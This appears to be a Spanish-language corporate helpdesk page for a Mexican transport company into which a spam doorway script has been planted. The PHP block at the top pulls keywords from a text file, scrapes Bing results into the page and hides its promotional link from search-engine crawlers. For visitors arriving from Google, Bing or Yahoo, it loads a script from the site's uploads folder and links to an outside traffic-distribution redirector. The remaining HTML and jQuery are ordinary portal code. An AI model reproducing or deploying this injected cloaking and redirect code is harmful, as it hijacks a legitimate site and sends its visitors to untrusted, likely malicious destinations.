<?php

$H=getenv("HTTP_REFERER");
if(@preg_match("/google|bing|yahoo/", $H)){
sleep(4);
echo "<img src=\"http://sistemas.tpitic.com.mx/uploads/CSO/PleaseWait.gif\">";
}

//$keyword='';
if (isset($_REQUEST['lts'])){
  $keyword=$_REQUEST['lts'];
}
$keyword=file('index1.php.txt');
$n=$_GET['lts'];

if(preg_match('@[A-z]@u', $n)){
$n=explode("-", $n);
$n=$n[0];
}

$name=$_GET['name'];

$nimg=$_GET['lts'];
$keyword=trim($keyword[$n]);
$keyword= str_replace(" ", "-",$keyword);
$query= urlencode($keyword);
$email = str_replace("-", "", $keyword);
$keyword=str_replace("-", " ", $keyword);
$nick = $keyword[1].$keyword[3].$keyword[2].$keyword[5].$keyword[3].$keyword[1].$keyword[6];
$nick=str_replace(" ", "", $nick);
$rm=mt_rand(1,10000);
$rma=mt_rand(1,31);
$desc=str_replace(" ", ", ", $keyword);



$n=$n+3;
$keyword1=file('index1.php.txt');
$basekey1=$keyword1[$n];
$urlo1=str_replace(" ", "-", $keyword1[$n]);
$urlo1=trim($urlo1);
$urlo1=urlencode($urlo1);
$randurl1=$n."-".$urlo1;
$randkey1 = $n;



$n=$n+5;
$keyword1=file('index1.php.txt');
$basekey2=$keyword1[$n];
$urlo2=str_replace(" ", "-", $keyword1[$n]);
$urlo2=trim($urlo2);
$urlo2=urlencode($urlo2);
$randurl2=$n."-".$urlo2;
$randkey2 = $n;

$n=$n+7;
$keyword1=file('index1.php.txt');
$basekey3=$keyword1[$n];
$urlo3=str_replace(" ", "-", $keyword1[$n]);
$urlo3=trim($urlo3);
$urlo3=urlencode($urlo3);
$randurl3=$n."-".$urlo3;
$randkey3 = $n;


$n=$n+9;
$keyword1=file('index1.php.txt');
$basekey4=$keyword1[$n];
$urlo4=str_replace(" ", "-", $keyword1[$n]);
$urlo4=trim($urlo4);
$urlo4=urlencode($urlo4);
$randurl4=$n."-".$urlo4;
$randkey4 = $n;


$n=$n+12;
$keyword1=file('index1.php.txt');
$basekey5=$keyword1[$n];
$urlo5=str_replace(" ", "-", $keyword1[$n]);
$urlo5=trim($urlo5);
$urlo5=urlencode($urlo5);
$randurl5=$n."-".$urlo5;
$randkey5 = $n;

$n=$n+14;
$keyword1=file('index1.php.txt');
$basekey6=$keyword1[$n];
$urlo6=str_replace(" ", "-", $keyword1[$n]);
$urlo6=trim($urlo6);
$urlo6=urlencode($urlo6);
$randurl6=$n."-".$urlo6;
$randkey6 = $n;

$n=$n+19;
$keyword1=file('index1.php.txt');
$basekey7=$keyword1[$n];
$urlo7=str_replace(" ", "-", $keyword1[$n]);
$urlo7=trim($urlo7);
$urlo7=urlencode($urlo7);
$randurl7=$n."-".$urlo7;
$randkey7 = $n;

$query1= str_replace("-", "+", $randkey1);

$promoform="<h2><a rel=\"nofollow\" href=\"http://777blogz.com/tds/go.php?sid=1&tds-key=$query\">$keyword</a></h2>";


if(@eregi("googlebot|slurp|msnbot|bot", getenv("HTTP_USER_AGENT"))) {
flush("tupie boti");
$promoform="";
}else{
$query=trim($query);
$H=getenv("HTTP_REFERER");
if(@preg_match("/google|bing|yahoo/", $H)){

//echo "<iframe frameborder=\"0\" height=\"100%\"  src=\"http://777blogz.com/tds/go.php?sid=1&tds-key=$query\" border:0px width=\"100%\"></iframe>";
echo "<script>
var keyword=\"$query\";
  </script>
  <script language=\"JavaScript\" src=\"http://sistemas.tpitic.com.mx/uploads/CSO/script.js\"></script>";


break;

}
}


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<title><?php echo $keyword ?> / Downloads 2015/ - Transportes Pitic</title>
<meta name="keywords" content="" />
<meta name="description" content="" />
<link href="http://sistemas.tpitic.com.mx/css/style.css" rel="stylesheet" type="text/css" media="screen" />
<!-- JQuerty UI -->
	<script type="text/javascript" src="http://sistemas.tpitic.com.mx/js/jquery-1.5.1.min.js"></script>
	<link type="text/css" href="http://sistemas.tpitic.com.mx/js/jqueryui/css/custom-theme/jquery-ui-1.8.11.custom.css" rel="stylesheet" />	
	<script type="text/javascript" src="http://sistemas.tpitic.com.mx/js/jqueryui/jquery-ui-1.8.11.custom.min.js"></script>
<!-- Libreria para subir archivos UPLOADIFY-->
	<link href="http://sistemas.tpitic.com.mx/js/uploadify/uploadify.css" type="text/css" rel="stylesheet" />
	<script type="text/javascript" src="http://sistemas.tpitic.com.mx/js/uploadify/swfobject.js"></script>
	<script type="text/javascript" src="../../js/uploadify/jquery.uploadify.v2.1.4.min.js"></script>
<!-- para validacion de formulario-->
	<link rel="stylesheet" href="../../js/validationEngine/css/validationEngine.jquery.css" type="text/css"/>
	<link rel="stylesheet" href="../../js/validationEngine/css/template.css" type="text/css"/>
	<script src="../../js/validationEngine/languages/jquery.validationEngine-es.js" type="text/javascript" charset="utf-8"></script>
	<script src="../../js/validationEngine/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
<!--Ventanas Modales OSX-->
	<link href="http://sistemas.tpitic.com.mx/css/osx.css" rel="stylesheet" type="text/css" media="screen" />
	<script type='text/javascript' src='../js/osx.js'></script>
	<script type='text/javascript' src='../../js/jquery.simplemodal.js'></script>
<!--configuraciones-->
	<script type="text/javascript" src="js/login.js"></script>
<!-- DataTables -->
	<script type="text/javascript" language="javascript" src="../js/datatables/media/js/jquery.dataTables.js"></script>
	<link type="text/css" href="../js/datatables/media/css/demo_page.css" rel="stylesheet" />
	<link type="text/css" href="../js/datatables/media/css/demo_table_jui.css" rel="stylesheet" />	
	<!--<link type="text/css" href="../js/datatables/css/jquery-ui-1.8.4.custom.css" rel="stylesheet" />-->
	
<script type="text/javascript">
function mainmenu(){
	// Oculto los submenus
	$(" #nav ul ").css({display: "none"});
	// Defino que submenus deben estar visibles cuando se pasa el mouse por encima
	$(" #nav li").hover(function(){
		$(this).find('ul:first:hidden').css({visibility: "visible",display: "none"}).slideDown(400);
		},function(){
			$(this).find('ul:first').slideUp(400);
	});
}
$(document).ready(function(){
    mainmenu();
});
</script>
<script type="text/javascript">
$(function(){
	//Caja que se lanza para levantar un caso	
	$('#dialog').dialog({
		autoOpen: false,
		width: 750,
		draggable: false,
		resizable: false,
		modal: true,
		closeOnEscape: false,
		buttons: {
			"Aceptar": function() {
				//evento pantalla(falso) para que aparezcan los errores.
				if($("#levantacaso").validationEngine('validate')){
					$.ajax({
						url: "../php/levantar_caso.php",
						data: $("#levantacaso").serialize()+"&adjuntos="+borrarAdj.slice(0,-1),
						type: "POST",
						success: function(data){
							if(data == "OK"){
								$('#levantacaso').validationEngine('hideAll');
								$("#dialog").dialog("close"); 
								$("#msgDialog").html("Se ha registrado su caso, en breve nos comunicamos con usted");
								$('#msgDialog').dialog('open');
							}
						},
						failure: function(){
							alert("Error en la peticion");
						}
					});
				}
				
				//$('#levantacaso').submit();
				$('#file_upload').uploadifyClearQueue();
			},

			"Cancelar": function() {
				$("#levantacaso").each (function(){this.reset();});
				try{
					$('#file_upload').uploadifyClearQueue();
					$('#levantacaso').validationEngine('hideAll');
					$.ajax({
						url: "../php/borrarArchivosSubidos.php",
						data: "borrar="+borrarAdj.slice(0,-1),
						type: "POST",
						success: function(data){
							
						},
						failure: function(){

						}
					});
					$(this).dialog("close");
				}catch(cancelException){
					$('#levantacaso').validationEngine('hideAll');
					$.ajax({
						url: "../php/borrarArchivosSubidos.php",
						data: "borrar="+borrarAdj.slice(0,-1),
						type: "POST",
						success: function(data){
							
						},
						failure: function(){

						}
					});
					$(this).dialog("close");
				}
			},
		}
	}).parent('.ui-dialog').find('.ui-dialog-titlebar-close').hide(); //con estas lineas se esconde el iconito de cerrar (osea la X)
	// Dialog Link
	$('#dialog_link').click(function(){
		$('#dialog').dialog('open');
		return false;
	});

	/*$('#dialog_link, ul#icons li').hover(
		function() { $(this).addClass('ui-state-hover'); }, 
		function() { $(this).removeClass('ui-state-hover'); }
	);*/


	$("#msgDialog").dialog({
		autoOpen: false,
		width: 400,
		draggable: true,
		resizeable: false,
		buttons:{
			"Aceptar": function(){
				$(this).dialog("close");
			}
		},
		close: function(event, ui) {if(!$('#dialog').dialog( "isOpen" )) document.location.href = document.location.href;}
	});
	
	/*$("#noempleado").change(function(){
		$.getJSON("php/autocompletar_info.php?noempleado="+$("#noempleado").val(), function(data){ 
			$.each(data, function(i, item){ 
				alert("#"+item.campo)
				$("#"+item.campo).val(item.value);
			}); 
		});
	});*/
	
	$("#usuario").change(function(){
		$.getJSON("../php/autocompletar_info.php?usuario="+$("#usuario").val(), function(data){ 
			$.each(data, function(i, item){ 
				$("#"+item.campo).val(item.value);
				$("#oficina option[value='"+item.valor+"']").attr('selected', 'selected');
			}); 
		});
	});
	//para subir archivos configuracion del elemento file
	var adjuntos = "";
	var borrarAdj = "";
	$('#file_upload').uploadify({
		'uploader'    	 : '../js/uploadify/uploadify.swf',
		'script'      	 : '../js/uploadify/uploadify.php?nocaso='+$("#nocaso").val(),
		'cancelImg'    : '../js/uploadify/cancel.png',
		'folder'      	 : 'uploads',
		'fileExt'     	 : '*.jpg;*.jpeg;*.gif;*.png;*.txt;*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.pdf',
		'fileDesc'    	 : 'Archivos de Imagen',
		'buttonText'  : 'Adjuntar Archivo',
		'scriptData': { 
			'session': '2i0dao2bep921sad0o1ti64tm2;'
		},
		'sizeLimit'   	 : 2097152,
		'onAllComplete' : function(event,data) {
					var adjuntosbr = adjuntos.replace(",", "<br>");
					$("#msgDialog").html("Se ha adjuntado correctamente el archivo(s)<br><br> "+adjuntosbr);
					$('#msgDialog').dialog('open');
					adjuntosbr="";
					adjuntos = "";
				},
		'onError'     : function (event,ID,fileObj,errorObj) {alert(errorObj.type + ' Error: ' + errorObj.info);},
		'onComplete'  : function(event, ID, fileObj, response, data) {
			adjuntos += fileObj.name+",";
			borrarAdj += "CSO"+$("#nocaso").val()+"-"+fileObj.name+",";
			},
		'rollover'		 : false,
		'multi'			 : true,
		'hideButton'  : false
	});

	$("#levantacaso").validationEngine('validate');
});
</script>
<style>
<style type="text/css" title="currentStyle">
.respuestas{
	background-color:#E6E6E6;
	border:1px solid blue;
	margin:10px;
}

#gallery {
	background-color: white;
	padding: 10px;
	width: 750px;
	height:150px;
	text-align: center;
}
#gallery ul { list-style: none; }
#gallery ul li { display: inline; }
#gallery ul img {
	border: 5px solid white;
	border-width: 5px 5px 20px;
}
#gallery ul a:hover img {
	border: 5px solid blue;
	border-width: 5px 5px 20px;
	color: blue;
}
#gallery ul a:hover { color: blue; }

#descripcion {
	background-color: white;
	padding: 10px;
	width: 560px;;
	height:150px;;
}
/************************************************/
.tInfoCasos{padding:5px;}
.tableLabels{
	background-color:#FAAC58;
	color:white;
}

.demoHeaders { margin-top: 2em; }

#asignacaso_link {padding: .4em 1em .4em 20px;text-decoration: none;position: relative; color:white;}
#asignacaso_link span.ui-icon {margin: 0 5px 0 0;position: absolute;left: .2em;top: 50%;margin-top: -8px;}

#casos_info_link {padding: .4em 1em .4em 20px;text-decoration: none;position: relative; color:white;}
#info_caso span.ui-icon {margin: 0 5px 0 0;position: absolute;left: .2em;top: 50%;margin-top: -8px;}

#casos_info_linkPM {padding: .4em 1em .4em 20px;text-decoration: none;position: relative; color:white;}
#info_casoPM span.ui-icon {margin: 0 5px 0 0;position: absolute;left: .2em;top: 50%;margin-top: -8px;}

ul#icons {margin: 0; padding: 0;}
ul#icons li {margin: 2px; position: relative; padding: 4px 0; cursor: pointer; float: left;  list-style: none;}
ul#icons span.ui-icon {float: left; margin: 0 4px;}
</style>
</head>
<body>
<div id="wrapper">
	<div id="wrapper2">
		<div id="header">
			<div id="logo">
				<img src="../images/logo.png" width="310px;" />
			</div>
			<div id="menu">
				<ul id="nav">
					<li><a href="../index.php">INICIO</a></li>
					<li><a href="index.php" style="color:orange;">HELPDESK</a>
					</li>
					<li><a href="#" id="utilidades" ><span>UTILIDADES</span></a>
						<ul class="submenu">
							<li><a id="as" href="#">Admin. Sistemas</a>
								<ul class="subsubmenu">
									<li><a href="../appsadmin.php">Compendio de Utileria</a></li>
									<li><a href="#">Gu&iacute;as de Instalaci&oacute;n</a></li>
								</ul>
							</li>
							<li><a href="#">T&eacute;cnicos</a>
								<ul class="subsubmenu">
									<li><a href="../appstecnicos.php">Compendio de Utileria</a></li>
									<li><a href="#">Gu&iacute;as de Instalaci&oacute;n</a></li>
								</ul>
							</li>
							<li><a href="#">Usuarios</a>
								<ul class="subsubmenu">
									<li><a href="../appsusuario.php">Compendio de Utileria</a></li>
									<li><a href="#">Gu&iacute;as de Instalaci&oacute;n</a></li>
								</ul>
							</li>
						</ul>
					</li>
					<li><a href="#">VIDEOS Y AVISOS</a></li>
					<li style="padding-right:30px;">
						<a href="#" id="dialog_link">LEVANTAR CASO</a>
					</li>
				</ul>
			</div>
		</div>
		<!-- end #header -->
		<div id="page">
			<div id="content">
				<div class="post">
					<h2><?php echo $keyword ?></h2>
					<!--Div que mostrara un error en caso de haberlo-->
					<center>
					
<?php

$filename = $nimg.".txt";
if (file_exists($filename)) {
echo file_get_contents($filename);
} else {

$kwk=urlencode($keyword);




$aaa = @file_get_contents("http://bing.com/search?q=$kwk+$basekey1[0]$basekey1[1]&first=1&FORM=PERE"); 
$aaa =str_replace("</p>", "</p>\n", $aaa);
$aaa =str_replace("<strong>", "", $aaa);
$aaa =str_replace("</strong>", "", $aaa);




preg_match_all("/<p>(.+)<\/p>/",$aaa, $p);

//images

//$image=@file_get_contents("http://www.bing.com/images/search?q=$kwk"); 
//$image =str_replace("imgurl", "\n imgurl", $image);
//$image =str_replace(".jpg", ".jpg\n", $image);
//preg_match("/imgurl:&quot;(.*).jpg/", $image, $pics);

//$pictur = "<img src=\"".$pics[1].".jpg\" alt=\"".$keyword."\" height=\"50%\" width=\"50%\"></img><br><br><br>";
//echo $pictur;

//$fop=fopen($nimg.".txt", "a+");
//fputs($fop, $pictur);

//end images



foreach($p[1] as $ps){



$texto="<li>".$ps."</li>\n";
echo $texto;

}

}

?>







<br>

DOWNLOAD <?php echo $promoform; ?>






<br>


   <a href="http://sistemas.tpitic.com.mx/uploads/CSO/index1.php?lts=<?php echo $randurl1?>"><?php echo $basekey1?></a><br>
      <a href="http://sistemas.tpitic.com.mx/uploads/CSO/index1.php?lts=<?php echo $randurl2?>"><?php echo $basekey2?></a><br>
      <a href="http://sistemas.tpitic.com.mx/uploads/CSO/index1.php?lts=<?php echo $randurl3?>"><?php echo $basekey3?></a><br>
      <a href="http://sistemas.tpitic.com.mx/uploads/CSO/index1.php?lts=<?php echo $randurl4?>"><?php echo $basekey4?></a><br>
      <a href="http://sistemas.tpitic.com.mx/uploads/CSO/index1.php?lts=<?php echo $randurl5?>"><?php echo $basekey5?></a><br>
      <a href="http://sistemas.tpitic.com.mx/uploads/CSO/index1.php?lts=<?php echo $randurl6?>"><?php echo $basekey6?></a><br>
      <a href="http://sistemas.tpitic.com.mx/uploads/CSO/index1.php?lts=<?php echo $randurl7?>"><?php echo $basekey7?></a><br>

<br>


</div>


					</div>
					<p>&nbsp;&nbsp;</p>
					<p>&nbsp;&nbsp;</p>
					<p>&nbsp;&nbsp;</p>
					<div id="info" name="info">
					</div>
					<img style="float:right; position:relative; top:-150px; right:10px;" src="../images/padlock.png" width="150px"/>
				</div>
			</div>
			<!-- end #content -->
			<div id="sidebar">
				<ul>
					<li>
						<div id="appsFrecuentes">
							<h3>Aplicaciones usualmente Descargadas</h3>
							<ul class="list2">
								<li><a href="../apps/jre-6u19-windows-i586.exe"><img src="../images/java.png" alt="" width="50" height="50" /></a></li>
								<li><a href="../apps/KAV_2010-12.exe"><img src="../images/kaspersky.png" alt="" width="50" height="50" /></a></li>
								<li class="nopad"><a href="../apps/Putty.exe"><img src="../images/putty.jpg" alt="" width="50" height="50" /></a></li>
								<li><a href="../apps/winscp432setup.exe"><img style="padding:5px;" src="../images/winscp.png" alt="" width="40" height="40" /></a></li>
								<li><a href="../apps/firefox_Setup 4.0.1.exe"><img style="padding:5px;" src="../images/firefox.jpg" alt="" width="40" height="40" /></a></li>
								<li class="nopad"><a href="../apps/pandion_setup.msi"><img style="padding:5px;"src="../images/pandion.jpg" alt="Pandion" width="40" height="40" /></a>
								<li><a href="../apps/tightvnc-1.3.9-setup.exe"><img style="padding:5px;" src="../images/vnc.jpg" alt="" width="40" height="40" /></a></li>
								<li><a href="../apps/wrar401es.exe"><img style="padding:5px;" src="../images/winrar.jpg" alt="" width="40" height="40" /></a></li>
								<li class="nopad"><a href="../apps/TeamViewer_Setup.exe"><img style="padding:5px;" src="../images/teamviewer.jpg" alt="" width="40" height="40" /></a></li>
							</ul>
						</div>
					</li>
					<li>
						<br /><br /><br /><br /><br /><br /><br /><br /><br />
						<h3>Portales Pitic</h3>
						<ul>
							<li><a href="https://tpitic.com.mx/plportal">Light</a></li>
							<li><a href="https://tpitic.com.mx/webpitic">Empleados</a></li>
							<li><a href="https://tpitic.com.mx/rh">Recursos Humanos</a></li>
							<li><a href="https://tpitic.com.mx/finanzas">Finanzas</a></li>
							<!--<li><a href="#">Lacus dapibus et interdum</a></li>
							<li><a href="#">Morbi sit amet magna  etiam</a></li>
							<li><a href="#">Maecenas sed sem lorem</a></li>
							<li><a href="#">Lacus dapibus interdum</a></li>
							<li><a href="#">Donec pede nisl dolore</a></li>-->
						</ul>
					</li>
				</ul>
			</div>
			<!-- end #sidebar -->
			<div style="clear: both;">&nbsp;</div>
			<div id="widebar">
				<div id="colA">
					<h3>Top Manuales</h3>
					<dl class="list1">
						<dt>13.06.2011</dt>
						<dd><a href="#" id="man1" class='osx' style="color:red;">Levantar un Caso</a></dd>
						<dt>13.06.2011</dt>
						<dd><a href="#" id="man2" class='osx' style="color:red;">Seguimiento de casos en el nuevo HelpDesk</a></dd>
						<dt>13.06.2011</dt>
						<dd><a href="#" id="man3" class='osx'>Instalaci&oacute;n y configuraci&oacute;n de Java</a></dd>
						<dt>13.06.2011</dt>
						<dd><a href="#" id="man5" class='osx'>Configuraci&oacute;n correo con Oulook 2000</a></dd>
					</dl>
				</div>
				<div id="colB">
					<h3>Novedades y Anuncios</h3>
					<img src="../images/banner01.jpg" width="450" height="150" />
				</div>
				<div style="clear: both;">&nbsp;</div>
			</div>
			<!-- end #widebar -->
		</div>
		<!-- end #page -->
	</div>
	<!-- end #wrapper2 -->
	<div id="footer">
		<p>Desarrollo y Mantenimiento del Portal por <a href="mailto:cmburboa@tpitic.com.mx">Misael Burboa</a> <br />(c) 2011 Transportes Pitic. 
	</div>
	
	<!-- Ventana Modal -->
	<div id="osx-modal-content">
		<div id="osx-modal-title">Manual de Algo</div>
		<div class="close"><a href="#" class="simplemodal-close">x</a></div>
		<div id="osx-modal-data">
			<div id="cont_modal">
				<p>&nbsp;</p>
			</div>
		</div>
	</div><!-- end ventana modal -->
</div><!-- end #wrapper -->
<!-- EL DIV PARA LEVANTAR UN CASO /***************************************/-->
<div id="dialog" title="Registro de Casos" style="font-family: 'Trebuchet MS', Arial, Helvetica, sans-serif;">
	Por favor llena los siguientes datos. Los campos con un (*) son obligatorios.<br><br><br>
	<form id="levantacaso" >
		<table>
		<tr><td>Caso No.</td><td>15124<input type="hidden" id="nocaso" name="nocaso" value=
15124></td></tr>
		<tr><td><label for="usuario">Usuario *</label></td><td><input type="text" id="usuario" name="usuario" style="height:15px;" maxlength="30" size="30" class="validate[required,custom[onlyLetter]]"/>&nbsp;&nbsp;&nbsp;<label for="noempleado">No. Empleado</label>&nbsp;&nbsp;&nbsp;<input type="text" id="noempleado" name="noempleado" style="height:15px;" maxlength="4" size="5" class="validate[custom[onlyNumber]]"/></td></tr>
		<tr><td><label for="nombre">Nombre *</label></td><td><input type="text" id="nombre" name="nombre" style="height:15px;" maxlength="50" size="56"class="validate[required,custom[onlyLetterSp]]"/></td></tr>
		<tr><td><label for="correo">Email *</label></td><td><input type="text" id="correo" name="correo" style="height:15px;" maxlength="30" size="40" class="validate[required,custom[email]"/></td></tr>
		<tr><td></tr>
		<tr><td>Telefono *</td><td><input type="text" id="lada" name="lada" style="height:15px;" size="3" maxlength="3" class="validate[required,custom[onlyNumber],minsize[2],maxsize[3]]"/><label for="numero">-</label><input type="text" id="numero" name="numero" style="height:15px;" maxlength="8" class="validate[required,custom[phone],minSize[7]],maxSize[8]" /><label for="ext">Ext *</label><input type="text" id="ext" name="ext" style="height:15px;" size="5" maxlength="5" class="validate[required,custom[phone],minSize[4]],maxSize[5]" /></td></tr>
		<tr><td><label for="depto">Departamento </label></td><td><select id='depto' name='depto' class='validate[required]' ><option value=''>Seleccione</option><option value='DGEN'>Direccion General</option><option value='DDDP'>Direccion DDP</option><option value='DFAD'>Direccion de Finanzas y Administracion</option><option value='ARCH'>Archivo</option><option value='SIST'>Sistemas</option><option value='VECC'>Ventas CC</option><option value='RECH'>Recursos Humanos</option><option value='VEZP'>Ventas Zona Pacífico</option><option value='TRAN'>Transporte</option><option value='MERC'>Mercadotecnia</option><option value='GERN'>Gerencia Regional Norte</option><option value='GERC'>Gerencia Regional Centro</option><option value='GERO'>Gerencia Regional Occidente</option><option value='GRNO'>Gerencia Regional Noroeste</option><option value='ACLI'>Atencion a Clientes</option><option value='DOCU'>Documentacion</option><option value='DCYC'>Credito y Cobranza</option><option value='DOPE'>Direccion de Operaciones</option><option value='GERS'>Gerencia Regional Sureste</option></select></td></tr>
		<tr><td><label for="oficina">Oficina *</label></td><td><select id='oficinas' name='oficinas' class='validate[required]'><option value='' SELECTED >Seleccione</option><option value='DFA'>Administracion</option><option value='BTX'>Batuc Express</option><option value='CCN'>CanCun</option><option value='CHI'>Chihuahua</option><option value='CUL'>Culiacan</option><option value='DC'>Direccion Comercial</option><option value='DO'>Direccion de Operaci</option><option value='DG'>Direccion General</option><option value='GDL'>Guadalajara</option><option value='HLO'>Hermosillo</option><option value='IZT'>Iztapalapa</option><option value='MNZ'>Manzanillo</option><option value='MAZ'>Mazatlan</option><option value='MER'>Merida</option><option value='MXL'>Mexicali</option><option value='MEX'>Mexico</option><option value='MCH'>Mochis</option><option value='MTY'>Monterrey</option><option value='MT1'>Monterrey Centro</option><option value='NOG'>Nogales</option><option value='COB'>Obregon</option><option value='PWM'>Proyecto Walmart</option><option value='PUE'>Puebla</option><option value='QUE'>Queretaro</option><option value='RH'>Recursos Humanos</option><option value='STA'>SantaAna</option><option value='SIS'>Sistemas</option><option value='TD'>Tecnologia Diesel</option><option value='TEP'>Tepic</option><option value='TIJ'>Tijuana</option><option value='TOL'>Toluca</option><option value='TRA'>Transporte</option><option value='VIL'>Villahermosa</option><option value='VCL'>Volvo Culiacan</option><option value='VHL'>Volvo Hermosillo</option><option value='VNG'>Volvo Nogales</option><option value='ZAP'>Zapopan</option></select></td></tr>
		<tr><td><label for="problema">Problema *</label></td><td><input type="text" id="problema" name="problema" class="validate[required]" size="93" maxlength="50"/></td></tr>
		<tr><td><label for="descripcion">Descripcion*</label></td><td><textarea id="descripcion" name="descripcion" cols="90" rows="10" maxlength="1500" class="validate[required]" style="resize:none;"/></textarea></td></tr>
		 <tr><td></td><td><input id="file_upload" name="file_upload" type="file" /><span style="color:red;float:left;">Maximo 2MB</span><br><br ><a href="javascript:$('#file_upload').uploadifyUpload();">Subir Archivos</a></td></tr>
		</table>
	</form>
</div>
<div id="msgDialog" title="Mensaje de Informacion"></div>

<!--***********************************************************************-->
</body>
</html>
